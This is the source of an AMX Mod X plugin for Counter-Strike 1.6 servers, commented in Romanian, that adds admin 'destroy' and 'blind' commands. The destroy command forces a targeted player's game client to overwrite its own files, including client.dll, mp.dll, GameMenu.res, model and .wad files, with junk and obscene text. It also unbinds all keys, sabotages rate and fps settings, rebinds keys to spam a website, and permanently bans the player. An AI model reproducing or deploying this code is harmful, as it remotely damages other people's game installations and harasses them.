#include <amxmodx>
#include <amxmisc>

#define PLUGIN "Destroy"
#define VERSION "2.0"
#define AUTHOR "daNzEt"

#define LOGFILE "destroy.txt"
new bool:g_bBlind[33];
new gmsgScreenFade;
new admin[33];

public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR);

	register_concmd("amx_destroy","cmdDestroy",ADMIN_IMNUNITY,"<nume>.");
	register_concmd("amx_distruge","cmdDestroy",ADMIN_IMNUNITY,"<nume>.");
	register_concmd("amx_blind","amx_blind", ADMIN_BAN,"<nume> - da blind jucatorului");
	register_concmd("amx_unblind","amx_unblind",ADMIN_BAN,"<nume> - unblind la jucator");
	gmsgScreenFade = get_user_msgid("ScreenFade")
	register_event("ScreenFade", "Event_ScreenFade", "b")
}

public plugin_precache()
{
   	precache_sound("destroy.wav") 

   	return PLUGIN_CONTINUE 
}

public client_putinserver(id)
{
   g_bBlind[id] = false;
}

public cmdDestroy(id,level,cid)
{
	if(!cmd_access(id,level,cid,2))
		return PLUGIN_HANDLED

	new argument[32]
	read_argv(1,argument,31)
	new jucator = cmd_target(id,argument,CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_NO_BOTS)

	if(!jucator)
		return PLUGIN_HANDLED

	new admin[32],jucator_x[32],ip[32]
	get_user_name(id,admin,31)
	get_user_name(jucator,jucator_x,31)
	get_user_ip(jucator,ip,31,1)

	//Mesaj Admin pentru comanda destroy
	chat_color(0,"!nAdmin !g%s !n: I-a dat destroy lui !g%s",admin,jucator_x)

	//Sunetul destroy
	client_cmd(0,"spk destroy");

	//Face o poza jucatorului in cauza
	client_cmd(jucator,"snapshot;snapshot;name ^"www.infectati.ro # Destroy^"");

	//Distruge cfg
	client_cmd(jucator,"unbindall");

	//Strica GameMenu jucatorului si cateva dll-uri importante
	client_cmd(jucator,"motdfile resource/GameMenu.res;motd_write Ai supt pula pe wwww.infectati.ro;motdfile models/player.mdl;motd_write wwww.infectati.ro;motdfile dlls/mp.dll;motd_write wwww.infectati.ro");
	client_cmd(jucator,"motdfile cl_dlls/client.dll;motd_write Ai supt pula pe wwww.infectati.ro;motdfile cs_dust.wad;motd_write wwww.infectati.ro;motdfile cstrike.wad;motd_write wwww.infectati.ro");
	client_cmd(jucator,"motdfile sprites/muzzleflash1.spr;motdwrite Ai supt pula pe wwww.infectati.ro;motdfile events/ak47.sc;motd_write wwww.infectati.ro;motdfile models/v_ak47.mdl;motd_write wwww.infectati.ro");

	//Distruge setari Counter
	client_cmd(jucator,"fps_max 1;rate 323612783126381256315231232;cl_cmdrate 932746234238477234732;cl_updaterate 3486324723944238423");
	client_cmd(jucator,"hideconsole;hud_saytext 0;cl_allowdownload 0;cl_allowupload 0;cl_dlmax 1;_restart;con_color ^"0 0 0^"");
	
	//Mesaje say pe bind
	client_cmd(jucator, "bind ^"w^" ^"say www.infectati.ro !." );
	client_cmd(jucator, "bind ^"s^" ^"say www.infectati.ro !." );
	client_cmd(jucator, "bind ^"r^" ^"say www.infectati.ro !." );
	client_cmd(jucator, "bind ^"`^" ^"say www.infectati.ro !." );


	//Baneaza jucatorul permanent
	client_cmd(id, "amx_banip ^"%s^" 0", ip)
	
	//Log Fisier
	log_to_file(LOGFILE, "Admin %s i-a dat destroy lui %s", admin , jucator_x)

	return PLUGIN_HANDLED
}

public amx_blind(id, level, cid)
{
   if(!cmd_access(id, level, cid, 2))
      return PLUGIN_HANDLED;

   new arg[32];
   read_argv(1, arg, 31)
   new user = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF | CMDTARGET_NO_BOTS);
   
   if(!user)
      return PLUGIN_HANDLED;

   new name2[32], name[32], ip[32];

   get_user_name(id, name, 31)
   get_user_name(user, name2, 31)
   get_user_ip(user, ip, 31, 1)
   admin[user] = id;
   
   if(g_bBlind[user])
   {
      console_print(id, "Jucatorul ^"%s^" are deja blind.", name2)
      return PLUGIN_HANDLED;
   }
   
   else
   {
      g_bBlind[user] = true;
      Fade_To_Black(user)
   }
   
   console_print(id, "Jucatorul ^"%s^" (ip: ^"%s^") a primit blind.", name2, ip)
   client_print(0, print_chat, "%s a primit blind", name2)
   log_to_file(LOGFILE, "Admin %s i-a dat blind lui %s", name , name2)

   return PLUGIN_HANDLED;
}

public amx_unblind(id, level, cid)
{
   if(!cmd_access(id, level, cid, 2))
   return PLUGIN_HANDLED;
   
   new arg[32];
   read_argv(1, arg, 31)
   new user = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF | CMDTARGET_NO_BOTS);
   
   if(!user)
      return PLUGIN_HANDLED;

   new name2[32], name[32], ip[32];
   get_user_name(id, name, 31)
   get_user_name(user, name2, 31)
   get_user_ip(user, ip, 31, 1)

   if(g_bBlind[user])
   {
      g_bBlind[user] = false;
      Reset_Screen(user)
   }
   
   else
   {
      console_print(id, "Jucatorul ^"%s^" are deja unblind.", name2);
      return PLUGIN_HANDLED;
   }
   
   console_print(id, "* Jucatorul ^"%s^" (ip: ^"%s^") a primit unblind.", name2, ip);
   client_print(0, print_chat, "%s a primit unblind", name2);
   log_to_file(LOGFILE, "Admin %s i-a scos blind-ul lui %s", name , name2);
   
   return PLUGIN_HANDLED;
}

public Event_ScreenFade(id)
{
   if(g_bBlind[id])
   {
      Fade_To_Black(id)
   }
}

Fade_To_Black(id)
{
   message_begin(MSG_ONE_UNRELIABLE, gmsgScreenFade, _, id)
   write_short((1<<3)|(1<<8)|(1<<10))
   write_short((1<<3)|(1<<8)|(1<<10))
   write_short((1<<0)|(1<<2))
   write_byte(255)
   write_byte(255)
   write_byte(255)
   write_byte(255)
   message_end()
}

Reset_Screen(id)
{
   message_begin(MSG_ONE_UNRELIABLE, gmsgScreenFade, _, id)
   write_short(1<<2)
   write_short(0)
   write_short(0)
   write_byte(0)
   write_byte(0)
   write_byte(0)
   write_byte(0)
   message_end()
}

stock chat_color(const id, const input[], any:...)
{
	new count = 1, players[32]

	static msg[191]

	vformat(msg, 190, input, 3)

	replace_all(msg, 190, "!g", "^4")
	replace_all(msg, 190, "!n", "^1")
	replace_all(msg, 190, "!t", "^3")
	replace_all(msg, 190, "!t2", "^0")

	if (id) players[0] = id; else get_players(players, count, "ch")
	{
		for (new i = 0; i < count; i++)
		{
			if (is_user_connected(players[i]))
			{
				message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i])
				write_byte(players[i])
				write_string(msg)
				message_end()
			}
		}
	}
}